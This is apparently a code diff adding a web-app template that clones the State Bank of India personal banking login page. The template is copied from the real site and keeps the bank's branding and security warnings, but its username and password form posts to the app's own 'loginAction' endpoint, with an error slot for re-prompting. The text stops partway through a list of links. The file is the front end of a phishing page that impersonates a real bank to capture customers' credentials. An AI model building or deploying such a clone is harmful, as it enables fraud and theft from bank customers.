@@ -1,0 +1,1326 @@
+@(errorMessage: String)
+<!DOCTYPE html>
+<!-- saved from url=(0045)https://retail.onlinesbi.com/retail/login.htm -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title> State Bank of India - Personal Banking</title>
+
+    <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
+    <meta http-equiv="PRAGMA" content="NO-CACHE">
+    <meta http-equiv="EXPIRES" content="0">
+    <!--  Javascript Declaration   -->
+
+
+    <meta name="format-detection" content="telephone=yes">
+
+    <meta name="viewport" id="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,initial-scale=1.0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="MobileOptimized" content="320">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="shortcut icon" href="https://retail.onlinesbi.com/sbijava/retail/images/favicon.ico" type="image/x-icon">
+
+    <!-- <link rel="stylesheet" href="/sbijava/retail/css/style.css" type="text/css" /> -->
+    <link rel="stylesheet" href="@routes.Assets.versioned("State Bank of India - Personal Banking_files/bootstrap.css")" type="text/css">
+
+    <link rel="stylesheet" href="@routes.Assets.versioned("State Bank of India - Personal Banking_files/phishing_login.css")" type="text/css">
+    <script type="text/javascript" src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/jquery-1.11.3.min.js.download")"></script>
+<script type="text/javascript" src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/bootstrap.js.download")"></script>
+    <script type="text/javascript" src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/common_virtual.js.download")"></script>
+<script type="text/javascript" src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/virtualkb_login.js.download")"></script>
+    <script type="text/javascript" src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/jquery.vticker.min.js.download")"></script>
+
+
+<script language="javascript1.2" type="text/javascript" src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/loginTrouble_5034_security.js.download")"></script>
+    <script language="javascript1.2" type="text/javascript" src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/md5_5034.js.download")"></script>
+<script language="javascript1.2" type="text/javascript" src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/sha512.js.download")"></script>
+    <script language="javascript1.2" type="text/javascript" src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/profile_sha.js.download")"></script>
+<script type="text/javascript" src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/common.js.download")"></script>
+    <script language="javascript1.2" type="text/javascript" src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/profile_sha_gc3.js.download")"></script>
+
+
+<script language="JavaScript">
+window.history.forward(0);
+</script>
+    <script>
+$(document).ready(function() {
+
+	$(".login_button").click(function(){
+        $("#login_block").show();
+		$("#phishing_block").hide();
+		window.parent.scrollTo(0,0);
+    });
+
+	$("div").delegate(".arrow", "click", function(e){
+		/*header open close - mobile*/
+			e.stopPropagation();
+			$("#header_navigation").slideToggle("swing");
+			if($(this).hasClass('arrow_up') ) {
+				$(this).removeClass('arrow_up').addClass('arrow_down');
+			} else {
+				$(this).removeClass('arrow_down').addClass('arrow_up');
+			}
+	    });
+
+	$('#reset_btn').click(function(){
+		document.getElementById("chkbox").checked = false;
+	});
+
+	/* Move To Top */
+	$(function () {
+		$(window).scroll(function () {
+			if ($(this).scrollTop() > 100) {
+				$("#scrollup").fadeIn()
+			} else {
+				$("#scrollup").fadeOut()
+			}
+		});
+		$("#scrollup").click(function () {
+			$("body,html").animate({
+				scrollTop: 0
+			}, 800);
+			return false
+		});
+	});
+
+	$('#netbanking_branches a').click(function(){
+		if($('#netbanking_popup').is(':hidden')) {
+			$('#netbanking_popup').slideDown(400);
+			$('#header').animate({'marginTop':'138px'});
+			$(this).addClass('netbanking_button_up');
+		}else{
+			$('#netbanking_popup').slideUp(400);
+			$('#header').animate({'marginTop':'0px'});
+			$(this).removeClass('netbanking_button_up');
+		}
+	});
+
+});
+</script>
+</head>
+
+<body>
+<div id="shadow">
+    <div id="wrapper" class="container">
+        <title>State Bank of India</title>
+
+        <div class="row" id="header">
+            <header id="headerContent">
+                <!-- Logo -->
+
+                <div class="col-lg-3 col-md-3 col-sm-3">
+                    <img src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/sbi-logo.png")" alt="VeriSign">
+                </div>
+                <div id="header_core_info">
+                    <div class="col-lg-9 col-md-9 col-sm-9">
+                        <div class="pull-right">
+                            <!-- 					<a href="javascript:void(0);" id="osbi_logo" class="hidden-xs">&nbsp;</a> -->
+                            <div id="header_navigation">
+
+                                <ul id="forms" class="pull-right">
+
+
+                                    <li class="about">
+                                        <a href="https://retail.onlinesbi.com/sbijava/retail/html/aboutus.html" target="_blank" accesskey="3" title="Press Alt + 3 and Enter"> About
+                                            OnlineSBI </a>
+
+                                    </li>
+
+
+                                    <!--   Modified By	:	Priya   Date			:	03/02/2015   For			:	SBP Hindi Starts-->
+
+
+                                    <li>
+                                        <a href="https://retail.onlinesbi.com/personal/reg_forms.html" target="_blank" title="Forms">Forms</a>
+
+                                    </li>
+                                    <!--   Modified By	:	Priya   Date			:	03/02/2015   For			:	SBP Hindi Ends-->
+                                    <li>
+                                        <a href="javascript:void(0);" class="last" onclick="openpopup();">Net Banking Branches</a>
+
+                                    </li>
+                                </ul>
+
+                            </div>
+
+
+                        </div>
+
+                    </div>
+                </div>
+
+                <!-- Modal box -->
+
+            </header>
+        </div>
+        <!-- Header core info Ends-->
+
+        <!-- Header Main Navigation-->
+
+        <div class="row" id="primary_navigation">
+            <nav role="navigation" class="navbar navbar-default" id="navContent">
+                <div class="navbar-header">
+                    <button id="ChangeToggle" type="button" data-target="#navbarCollapse" data-toggle="collapse" class="navbar-toggle collapsed">
+                        <div id="navbar-hamburger">
+                            <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span>
+                        </div>
+                        <div id="navbar-close" class="hidden">
+                            <span class="glyphicon glyphicon-remove"></span>
+                        </div>
+                    </button>
+                    <div class="arrow_icon pull-right hidden-lg hidden-md hidden-sm">
+                        <a href="javascript:void(0);" class="arrow arrow_up">&nbsp;</a>
+                    </div>
+                </div>
+                <div id="navbarCollapse" class="collapse navbar-collapse nav-comn">
+                    <ul class="nav navbar-nav" id="navigation">
+
+
+                        <li class="active_menu"><a href="https://retail.onlinesbi.com/">Home</a>
+                        </li>
+
+
+
+
+
+                        <!--Added for Productions and services post login updation-->
+                        <!--<td width="158" class="topNavTextNormal"><a href="#" onclick="window.open('/sbijava/productsandservices.html','productservice','width=780, height=500, status=1, scrollbars=1, location=0')">Products &amp; Services</a></td>-->
+                        <li><a href="https://retail.onlinesbi.com/retail/login.htm#" onclick="window.open(&#39;/personal/productandservices.html&#39;,&#39;productservice&#39;,&#39;width=780, height=500, status=1, scrollbars=1, location=0&#39;)">Products
+                            &amp; Services</a></li>
+                        <!--Added for Productions and services post login updation-->
+
+
+
+                        <!-- <li><a onclick="javascript:window.open('/personal/sbijava/howdoi/prelogin/retail_hdi_sbi_base_prelogin.html','howdoi','width=790, height=540, status=0, scrollbars=0, location=0')"
+                href="#">How Do I</a></li> -->
+                        <li><a href="https://retail.onlinesbi.com/personal/rinb_videos.html" target="_blank">How Do I</a></li>
+
+
+
+                    </ul>
+                </div>
+
+                <!-- Header Main Navigation Ends-->
+            </nav>
+        </div>
+
+
+        <!-- Added for CR-2424, To disable right click option for the entire site -->
+        <script language="javascript">
+	var message = "This function is not allowed here.";
+	function clickIE4() {
+
+		if (event.button == 2) {
+			alert(message);
+			return false;
+		}
+	}
+
+	function clickNS4(e) {
+		if (document.layers || document.getElementById && !document.all) {
+			if (e.which == 2 || e.which == 3) {
+				alert(message);
+				return false;
+			}
+		}
+	}
+
+	if (document.layers) {
+		document.captureEvents(Event.MOUSEDOWN);
+		document.onmousedown = clickNS4;
+	}
+
+	else if (document.all && !document.getElementById) {
+		document.onmousedown = clickIE4;
+	}
+
+	document.oncontextmenu = new Function("alert(message);return true;")
+</script>
+
+        <!-- Added for CR-2424, To disable right click option for the entire site: ends here-->
+
+        <!--header ends here     -->
+
+
+
+
+
+
+        <!--Added for hindi Translation -->
+
+
+
+
+        <!-- <script src='https://www.google.com/recaptcha/api.js'></script> -->
+
+        <!-- CR 2614 changes end -->
+
+        <style>
+a.tooltip {
+	outline: none;
+}
+
+a.tooltip strong {
+	line-height: 30px;
+}
+
+a.tooltip:hover {
+	text-decoration: none;
+}
+
+a.tooltip span {
+	z-index: 10;
+	display: none;
+	padding: 14px 20px;
+	margin-top: -30px;
+	margin-left: 28px;
+	width: 300px;
+	line-height: 16px;
+}
+
+a.tooltip:hover span {
+	display: inline;
+	position: absolute;
+	color: #111;
+	border: 1px solid #DCA;
+	background: #fffAF0;
+}
+
+.callout {
+	z-index: 20;
+	position: absolute;
+	top: 30px;
+	border: 0;
+	left: -12px;
+}
+
+/*CSS3 extras*/
+a.tooltip span {
+	border-radius: 4px;
+	box-shadow: 3px 3px 5px #CCC;
+}
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        <!-- phishing starts here -->
+
+        <div id="phishing_block" style="display: none;">
+
+            <!-- Browser Cache-->
+            <!-- <div id="browser_cache">
+                            <p><img src="/sbijava/personal/images/forcelogin.gif"></p>
+                        </div> -->
+            <!-- Browser Cache Ends-->
+
+            <!-- Personal Banner-->
+            <div class="row banner_box" id="banner">
+                <div class="col-lg-12 col-md-12 col-sm-12 col-comn hidden-xs">
+                    <img src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/personal_banner.jpg")" alt="banner">
+                </div>
+
+
+                <div class="continue_btn">
+
+                    <a href="javascript:void(0);" class="login_button" onclick="fnShowContent(&#39;errorCode&#39;,&#39;english&#39;)">CONTINUE
+                        TO LOGIN</a>
+                </div>
+
+                <!-- <a href="https://retail.onlinesbi.com/personal/" id="features">FEATURES</a> -->
+            </div>
+            <!-- Personal Banner Ends-->
+
+
+            <!-- Accept & Reject Section-->
+            <div class="row" id="phishing_message">
+
+                <div class="col-lg-3 col-md-3 col-sm-3">
+                    <div class="phishing_box">
+                        <span class="accept">&nbsp;</span>
+                        <h3 class="always">
+                            ALWAYS
+                        </h3>
+                        <p>
+                            keep your computer <br>free of malware
+                        </p>
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-3 col-sm-3">
+                    <div class="phishing_box">
+                        <span class="accept">&nbsp;</span>
+                        <h3 class="always">
+                            ALWAYS
+                        </h3>
+                        <p>
+                            change your passwords <br>periodically
+                        </p>
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-3 col-sm-3">
+                    <div class="phishing_box">
+                        <span class="reject">&nbsp;</span>
+                        <h3 class="never">
+                            NEVER
+                        </h3>
+                        <p>
+                            respond to any communication <br>seeking your passwords
+                        </p>
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-3 col-sm-3">
+                    <div class="phishing_box last_box">
+                        <span class="reject">&nbsp;</span>
+                        <h3 class="never">
+                            NEVER
+                        </h3>
+                        <p>
+                            reveal your passwords or <br> card details to anyone
+                        </p>
+                    </div>
+                </div>
+
+            </div>
+            <!-- Accept & Reject Section Ends-->
+
+            <h2 class="own_head">
+                FOR YOUR OWN SECURITY
+            </h2>
+
+            <!-- Phishing Contents-->
+            <div class="row" id="phishing_contents">
+                <div class="col-lg-6 col-md-6 col-sm-6">
+                    <h3>
+                        Please ensure the following before logging into OnlineSBI
+                    </h3>
+
+                    <ul class="phishing_list">
+                        <li>The URL in your browser address bar begins with "https".</li>
+                        <li>The address or status bar displays the padlock symbol.
+                        </li>
+                        <li>Click the padlock to view and verify the security certificate.
+                        </li>
+                        <li>The address bar turns  green indicating that the site is secured with an SSL Certificate that meets the Extended Validation Standard.
+                        </li>
+                        <li>(SSL is compatible for IE 7.0 and above, Mozilla Firefox 3.1 and above, Opera 9.5 and above, Safari 3.5 and above, Google Chrome).
+                        </li>
+
+                    </ul>
+                </div>
+
+
+                <div class="col-lg-6 col-md-6 col-sm-6">
+                    <!-- <div class="phishing_contents reject_box"> -->
+                    <h3>
+                        Beware of Phishing attacks
+                    </h3>
+                    <ul class="phishing_list">
+                        <li>Phishing is a fraudulent attempt, usually made through email, phone calls, SMS etc seeking your personal and confidential information.
+                        </li>
+                        <li>State Bank or any of its representative never sends you email/SMS or calls you over phone to get your personal information,password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking.
+                            Never respond to such email/SMS or phone call. Please report immediately on report.phishing@@sbi.co.in if you receive any such email/SMS or Phone call. Please lock your user access immediately, if you have accidentally revealed your credentials.Click here to lock.
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <!-- Phishing Contents Ends-->
+
+            <!-- Terms-->
+            <div class="row" id="terms_area">
+                <div class="col-lg-12 col-md-12 col-sm-12 terms">
+                    <div class="col-lg-10 col-sm-9 col-xs-12">
+                        <p>By clicking on "Continue to Login"  button, you agree to the Terms of Service (Terms &amp; Conditions) of usage of Internet Banking of SBI.</p>
+                    </div>
+                    <div class="col-lg-2 col-sm-3 col-sm-offset-0 col-xs-8 col-xs-offset-2">
+                        <div class="cont_btn_bottom loginDisplay">
+                            <a href="javascript:void(0);" onclick="fnShowContent(&#39;errorCode&#39;,&#39;english&#39;)" class="login_button">CONTINUE TO LOGIN</a>
+                        </div>
+                    </div>
+                </div>
+                <!-- Terms Ends-->
+
+            </div>
+        </div>
+        <!-- Terms Ends-->
+
+
+
+
+        <div id="phishing_block_hindi" style="display: none;">
+
+            <!--
+                        Browser Cache
+                        <div id="browser_cache">
+                            <p><img src="/personal/images/cache.gif"></p>
+                            Added by mano for Announcement for user of 180 days force login chnages
+                            <p><img src="/sbijava/retail/images/forcelogin.gif"></p>
+                            Ends by mano
+                        </div>
+                        Browser Cache Ends
+                         -->
+            <!-- Personal Banner-->
+            <div class="row banner_box" id="banner">
+                <div class="col-lg-12 col-md-12 col-sm-12 col-comn hidden-xs">
+                    <img src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/personal_banner.jpg")" alt="banner">
+                </div>
+
+                <div class="col-lg-12 col-md-12 col-sm-12 col-comn hidden-xs">
+                    <div class="continue_btn">
+                        <a href="javascript:void(0);" class="login_button" onclick="fnShowContent(&#39;errorCode&#39;,&#39;english&#39;)">लॉग
+                            इन जारी </a>
+                    </div>
+                </div>
+            </div>
+            <!-- Personal Banner Ends-->
+
+
+            <!-- Accept & Reject Section Starts-->
+
+            <div class="row" id="phishing_message">
+                <div class="col-lg-3 col-md-3 col-sm-3">
+                    <div class="phishing_box">
+                        <span class="accept">&nbsp;</span>
+                        <h3 class="always">कृपया</h3>
+                        <p>
+                            समय-समय पर
+                            अपना <br>पासवर्ड
+                            बदलें.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="col-lg-3 col-md-3 col-sm-3">
+                    <div class="phishing_box">
+                        <span class="accept">&nbsp;</span>
+                        <h3 class="always">कृपया</h3>
+                        <p>
+                            मैलवेयर से
+                            हमेशा अपने
+                            कंप्यूटर
+                            को <br>मुक्त
+                            रखें.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="col-lg-3 col-md-3 col-sm-3">
+                    <div class="phishing_box">
+                        <span class="reject">&nbsp;</span>
+                        <h3 class="never">नहीं</h3>
+                        <p>
+                            कृपया अपना
+                            पासवर्ड या
+                            कार्ड का <br>विवरण&nbsp;
+                            किसी को दे.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="col-lg-3 col-md-3 col-sm-3">
+                    <div class="phishing_box last_box">
+                        <span class="reject">&nbsp;</span>
+                        <h3 class="never">नहीं</h3>
+                        <p>आपके
+                            पासवर्ड की
+                            मांग करने
+                            वाले किसी
+                            भी संवाद का
+                            जवाब दे</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Accept & Reject Section Ends-->
+
+            <h2 class="own_head">अपनी
+                खुद की
+                सुरक्षा के
+                लिए</h2>
+
+            <!-- Phishing Contents-->
+            <div class="row" id="phishing_section">
+                <div class="col-lg-6 col-md-6 col-sm-6">
+                    <h3>लॉग इन
+                        करने से
+                        पहले
+                        निम्नवत
+                        सुनिश्चित
+                        करें</h3>
+                    <ul class="phishing_list">
+                        <li>आपके
+                            &nbsp;इंटरनेट
+                            ब्राउज़र
+                            के एड्रेस
+                            बार में
+                            यूआरएल "https"
+                            के साथ शुरू
+                            होता है. 'https' के
+                            अंत में
+                            अक्षर 's' &nbsp;का
+                            अर्थ
+                            'सुरक्षित'
+                            है.</li>
+                        <li>वेब पेज के
+                            डिस्प्ले
+                            क्षेत्र के
+                            भीतर
+                            एड्रेस बार
+                            या स्टेटस
+                            बार
+                            (ज्यादातर
+                            एड्रेस बार
+                            में) में
+                            ताले का
+                            प्रतीक
+                            चिह्न को&nbsp;
+                            देखें. ताले
+                            पर क्लिक
+                            करके
+                            सुरक्षा
+                            प्रमाणपत्र
+                            सत्यापित
+                            करें.</li>
+                        <li>एड्रेस
+                            बार का हरे
+                            रंग में बदल
+                            जाना यह
+                            दर्शाता है
+                            कि साइट SSL
+                            प्रमाणपत्र
+                            के साथ
+                            सुरक्षित
+                            है एवं Extended Validation Standard
+                            के मानक को
+                            पूरा करती
+                            है. (आईई 7.0 और
+                            ऊपर,
+                            मोज़िला
+                            फ़ायरफ़ॉक्स
+                            3.1 और ऊपर,
+                            ओपेरा 9.5 और
+                            ऊपर, सफ़ारी
+                            3.5 और ऊपर ,
+                            गूगल क्रोम
+                            &nbsp;में
+                            उपलब्ध).</li>
+                        <li>किसी भी
+                            पॉप अप
+                            विंडो में
+                            लॉग इन ना
+                            करें एवं
+                            अन्य
+                            संवेदनशील
+                            जानकारी
+                            &nbsp;भी दर्ज न
+                            करें.</li>
+                        <!-- <li><a href="https://retail.onlinesbi.com/personal/imp_security_tips.html" target="_blank">&#2332;&#2381;&#2351;&#2366;&#2342;&#2366; &#2360;&#2369;&#2352;&#2325;&#2381;&#2359;&#2366; &#2360;&#2306;&#2325;&#2375;&#2340;</a></li> -->
+                    </ul>
+                </div>
+
+                <div class="col-lg-6 col-md-6 col-sm-6">
+                    <!-- <div class="phishing_contents reject_box"> -->
+                    <h3>फ़िशिंग
+                        हमलों से
+                        सावधान</h3>
+                    <ul class="phishing_list">
+                        <li>फ़िशिंग
+                            आम तौर पर
+                            ईमेल, फोन
+                            कॉल, एसएमएस
+                            आदि के
+                            माध्यम से
+                            किए
+                            जानेवाला
+                            धोखाधड़ी
+                            का प्रयास
+                            है
+                            &nbsp;जिसमें&nbsp;
+                            ग्राहकों
+                            की
+                            व्यक्तिगत
+                            और गोपनीय
+                            जानकारी की
+                            मांग की
+                            जाती है.</li>
+                        <li>स्टेट
+                            बैंक या
+                            उसका
+                            प्रतिनिधि
+                            आपकी
+                            व्यक्तिगत
+                            जानकारी,
+                            पासवर्ड या
+                            वन टाइम
+                            &nbsp;पासवर्ड
+                            (ओटीपी)&nbsp;
+                            प्राप्त
+                            करने के लिए
+                            आपको फोन
+                            कॉल या किसी
+                            भी तरह का
+                            &nbsp;ईमेल
+                            /एसएमएस
+                            नहीं भेजता
+                            है॰ ऐसी कोई
+                            भी e-mail/SMS या फोन
+                            कॉल धोखे से
+                            इंटरनेट
+                            बैंकिंग के
+                            माध्यम से
+                            आपके &nbsp;खाते
+                            से पैसे
+                            निकालने का
+                            एक प्रयास
+                            है. इस तरह के
+                            ईमेल /
+                            एसएमएस या
+                            फोन कॉल का
+                            जवाब कभी न
+                            दें. &nbsp;यदि
+                            आपको ऐसे
+                            ईमेल /
+                            एसएमएस या
+                            फोन कॉल
+                            प्राप्त
+                            &nbsp;होते हैं,
+                            इसे पर
+                            तुरंत
+                            रिपोर्ट
+                            करें. अगर
+                            &nbsp;उपरोक्त
+                            जानकारी
+                            आपने गलती
+                            से&nbsp; किसी को
+                            बता दिया है
+                            तो &nbsp;अपना
+                            इंटरनेट
+                            खाता &nbsp;बंद
+                            करने के लिए
+                            यहाँ <a href="https://retail.onlinesbi.com/retail/login.htm#" onclick="window.open(&#39;lockaccountdetails.htm?bankCode=0&#39;,&#39;aboutus&#39;,&#39;width=780, height=500 ,status=1, scrollbars=1, location=0&#39;)" tabindex="7">क्लिक
+                                करे</a>.</li>
+                    </ul>
+                    <!-- </div> -->
+                </div>
+            </div>
+            <!-- Phishing Contents Ends-->
+
+            <!-- Terms-->
+            <div class="row" id="terms_area">
+                <div class="col-lg-12 col-md-12 col-sm-12 terms">
+                    <div class="col-lg-10 col-sm-9 col-xs-12"><p>
+                        "लॉग इन
+                        जारी " बटन
+                        पर क्लिक
+                        करते ही यह
+                        माना जाएगा
+                        कि आप
+                        भारतीय
+                        स्टेट बैंक
+                        की इंटरनेट
+                        बैंकिंग के
+                        उपयोग की
+                        सेवा
+                        शर्तों से
+                        सहमत हैं.
+                    </p></div>
+                    <div class="col-lg-2 col-sm-3 col-sm-offset-0 col-xs-8 col-xs-offset-2">
+                        <div class="cont_btn_bottom loginDisplay">
+                            <a href="javascript:void(0);" class="login_button" onclick="fnShowContent(&#39;errorCode&#39;,&#39;english&#39;)">लॉग
+                                इन जारी </a>
+                        </div></div>
+
+                </div>
+                <!-- Terms Ends-->
+
+            </div>
+        </div>
+
+
+
+
+
+        <!-- login content starts here-->
+
+        <!-- Browser Cache-->
+        <!-- <div id="browser_cache" style="margin:10px auto;">
+                            <p><img src="/personal/images/cache.gif"></p>
+                            Added by mano for Announcement for user of 180 days force login
+                            <p><img src="/sbijava/personal/images/forcelogin.gif"></p>
+                            Ends by mano
+
+                        </div> -->
+        <!-- Browser Cache Ends-->
+
+        <form name="loginForm" method="post" action="loginAction">
+            <div id="login_block" style="">
+
+                <div class="row">
+                    <!-- Added for KiosK - CR 2914  -->
+
+
+
+
+
+
+                    <input type="hidden" name="hdnKioskID" value=""> <input type="hidden" name="hdnKModeUserName" value="">
+                    <input type="hidden" name="errorCode" value=""> <input type="hidden" name="isGoogleCaptchaReq" value=""> <input type="hidden" name="userType" value=""> <input type="hidden" name="lockCount" value=""> <input type="hidden" name="captchaDisplayCount" value=""> <input type="hidden" name="unknownUserlockCount" value="">
+
+                    <!-- Added for KiosK - CR 2914  -->
+
+                    <input type="hidden" name="bankCode" value="0"> <input type="hidden" name="browserName" id="browserName" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36">
+                    <!-- Added by Venkatesh -->
+                    <!--  Added by Murugan K - to avoid the wrong updation login_count CR -1294-->
+                    <input type="hidden" name="shapassword" value=""> <input type="hidden" name="language" value="english">
+
+
+
+
+
+
+
+                    <div class="login_heading">
+                        <div class="col-lg-2 col-md-2 col-sm-3 col-xs-12">
+                            <h3>
+                                Login to OnlineSBI
+                            </h3>
+                        </div>
+                        <div class="col-lg-7 col-md-6 col-sm-5 col-xs-12">
+                            <!--<div class="col-lg-1 col-md-1 col-sm-1 hidden-xs hidden-sm">
+                                <span class="newIcon"></span>
+                            </div>-->
+                            <div id="wpanel_vticker" style="overflow: hidden; position: relative; height: 30px;">
+                                <ul style="position: absolute; margin: 0px; padding: 0px; top: -10.3807px;">
+
+
+
+                                    <li class="hidden-xs hidden-sm" style="margin: 0px; padding: 0px; opacity: 0.66514;">You can also bank using our Mobile Banking application, 'SBI Anywhere Personal'. <a href="https://mobility.onlinesbi.com/sbf_retail.html" target="_blank">Know More. </a>
+                                        <!--App!-->
+                                    </li><li class="visible-xs-block visible-sm-block" style="margin: 0px; padding: 0px;">You can also bank using our Mobile Banking application, 'SBI Anywhere Personal'. <br> <a href="https://mobility.onlinesbi.com/sbf_retail.html" target="_blank">Know More. </a>
+                                    <!--App!-->
+                                </li><li class="hidden-xs hidden-sm" style="margin: 0px; padding: 0px;">You can also bank using our Mobile Banking application, 'SBI Anywhere Personal'. <a href="https://mobility.onlinesbi.com/sbf_retail.html" target="_blank">Know More. </a>
+                                    <!--App!-->
+                                </li></ul>
+                            </div>
+                        </div>
+                        <div class="col-lg-3 col-md-4 col-sm-4 hidden-xs">
+									<span class="welcome_text">Welcome to Personal Internet Banking
+									</span>
+                        </div>
+                    </div>
+
+
+
+
+
+                </div>
+                <div class="err_mssg_fe"></div>
+
+
+                <div class="row">
+                    <div id="login_fields">
+                        <div class="col-lg-6 col-md-6 col-sm-6 user_details">
+
+                            <p>
+
+
+
+                                <!-- <span>(CARE:</span> Username and password are case sensitive.) -->
+                                (<span>CARE:  </span>
+                                Username and password are case sensitive.)
+
+
+
+
+
+                            </p>
+
+                            <div style="color: red">@errorMessage</div>
+
+                            <div class="col-lg-6 col-md-6 col-sm-6">
+                                <div class="form-group">
+
+
+
+
+                                    <label for="username">Username* </label>
+
+
+
+
+
+
+                                    <!--  added for CR 5034 - begin-->
+
+
+
+                                    <input name="username" type="text" class="form-control" id="username" tabindex="12" size="30" maxlength="30" onfocus="getFocus(this.id);" autocomplete="off" oncopy="return false" onpaste="return false" onkeypress="return disableCtrlKeyCombination(event);" onkeydown="return disableCtrlKeyCombination(event);">
+                                    <!-- <input name="userName" type="text"  class="form-control" id="username"  onfocus="disableautocompletion(this.id);getFocus(this.id);" autocomplete="off" onblur="disableautocompletion(this.id);" onCopy="return false" onPaste="return false" onKeyPress="return disableCtrlKeyCombination(event);" onKeyDown="return disableCtrlKeyCombination(event);"/> -->
+
+
+
+
+                                </div>
+                                <div class="form-group">
+                                    <!--  added for CR 5034 - end -->
+                                    <!-- div class="form-group"> -->
+
+
+
+                                    <label for="username">Password* </label>
+
+
+
+
+
+                                    <input name="password0" type="password" value="Dummy123" style="display: none"> <input name="password" type="password" class="form-control" id="label2" tabindex="13" title="password" size="30" onfocus="disableautocompletion(this.id);getFocus(this.id);" autocomplete="off" onblur="disableautocompletion(this.id);" oncopy="return false" onpaste="return false" onkeypress="return disableCtrlKeyCombination(event);" onkeydown="return disableCtrlKeyCombination(event);">
+                                    <input name="password1" type="password" value="Dummy123" style="display: none">
+
+
+
+
+                                </div>
+                                <div class="form-group">
+
+                                    <input class="btn btn-default" type="submit" tabindex="15" title="Login" value="Login" id="Button2" />
+
+
+
+                                    <input class="btn btn-default" type="reset" tabindex="16	" title="Reset" id="reset_btn" value="Reset" onclick="constructKeyboard(false)">
+                                </div>
+                            </div>
+
+
+
+
+                            <div class="col-lg-6 col-md-6 col-sm-6 forgot_details">
+                                <ul class="user_links">
+
+
+
+                                    <li><a tabindex="16" onclick="fnNewUserClick();" href="https://retail.onlinesbi.com/retail/login.htm#">New User ? Register here </a>
+                                    </li>
+
+
+
+
+
+
+
+                                    <li><a tabindex="17" onclick="window.open(&#39;troubleloginhome.htm?bankCode=0&#39;,&#39;aboutus&#39;,&#39;width=780, height=500 ,status=1, scrollbars=1, location=0,resizable=yes&#39;)" href="https://retail.onlinesbi.com/retail/login.htm#">Forgot Login Password </a>
+                                    </li>
+                                    <li><a tabindex="18" onclick="window.open(&#39;forgotusername.htm?bankCode=0&#39;,&#39;aboutus&#39;,&#39;width=780, height=500 ,status=1, scrollbars=1, location=0,resizable=yes&#39;)" href="https://retail.onlinesbi.com/retail/login.htm#">Forgot Username </a>
+                                    </li>
+                                    <!-- forgotusername -->
+
+
+
+
+
+                                </ul>
+
+
+                                <div class="virtual">
+
+                                    <p>
+                                        <input type="checkbox" id="chkbox" class="chek_box" onclick="constructKeyboard();">&nbsp;
+                                        Enable Virtual Keyboard
+                                    </p>
+
+
+                                </div>
+                            </div>
+                            <div class="virtual_link">
+
+
+                                For better security use the Online Virtual Keyboard to login.
+
+
+                                <a href="https://retail.onlinesbi.com/personal/virtualkeyboard.html"> <strong>
+
+
+                                    More
+
+
+                                </strong>...</a>
+                            </div>
+
+                        </div>
+                        <!-- </div>    -->
+                        <!-- Login detail left Ends here  -->
+                        <div class="col-lg-6 col-md-6 col-sm-6 col-comn">
+                            <div id="login_banner">
+                                <div id="vkb_content" class="virtual_key ">
+                                    <div id="vkb_content" class="virtual_key ">
+                                        <span id="kbplaceholder"><table border="0" class="keyboardtbl" cellspacing="3px" id="keypad" width="100%"><tbody><tr><td><img src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/login_img.png")" alt="login image"></td></tr></tbody></table></span>
+                                    </div>
+
+                                </div>
+
+                            </div>
+
+
+                        </div>
+                    </div>
+                </div>
+
+
+                <div class="row" id="login_area">
+                    <div class="col-lg-4 col-md-4 col-sm-4">
+                        <!-- <div class="notificaion_con"> -->
+                        <div class="login_box">
+                            <span class="glyphicon glyphicon-info-sign"></span>
+
+
+                            <!-- <p> <span class="spl_txta">NEVER</span> respond to any popup,email, SMS or phone call,
+                            <span class="spl_txta">no matter how appealing or official  looking,</span>  seeking your personal information  such as username, password(s), mobile number, ATM Card details, etc. Such communications are sent or created by fraudsters to trick you into parting with your credentials.</p>	 -->
+                            <p>
+                                NEVER respond to any popup,email, SMS or phone call, no matter how appealing or official looking, seeking your personal information such as username, password(s), mobile number, ATM Card details, etc. Such communications are sent or created by fraudsters to trick you into parting with your credentials.
+                            </p>
+
+
+
+                        </div>
+                    </div>
+
+
+
+                    <div class="col-lg-4 col-md-4 col-sm-4">
+                        <div class="login_box">
+                            <span class="glyphicon glyphicon-link"></span>
+                            <div class="login_xs">
+
+                                <ul class="login_box_links">
+
+
+                                    <!-- <li><a style="color:#f44248" class="tooltip"  tabindex="19" href="https://cms.onlinesbi.com/CMS"> -->
+                                    <li><a tabindex="19" href="https://cms.onlinesbi.com/CMS/">
+
+                                        Complaints
+                                    </a>
+                                    </li>
+
+
